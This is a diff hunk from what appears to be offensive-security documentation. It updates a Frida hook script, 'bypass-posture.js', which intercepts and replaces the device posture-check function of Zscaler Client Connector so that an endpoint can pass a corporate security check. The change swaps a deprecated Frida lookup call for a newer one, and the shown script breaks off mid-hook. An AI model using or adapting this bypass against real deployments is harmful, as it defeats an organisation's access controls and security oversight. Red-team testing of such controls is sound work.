@@ -322,7 +322,7 @@ frida-trace -i '*[Pp]osture*' -n ZscalerClientConnector
 
 # 3. Write a Frida hook (see payloads.md Appendix D.1)
 cat > /tmp/bypass-posture.js << 'EOF'
-const postureFunc = Module.findExportByName(null, '_ZN20ZscalerClientConnector13getPostureEv');
+const postureFunc = Module.getGlobalExportByName( '_ZN20ZscalerClientConnector13getPostureEv');
 if (postureFunc) {
   Interceptor.replace(postureFunc, new NativeCallback(() => {
     console.log('[+] Posture hook fired');
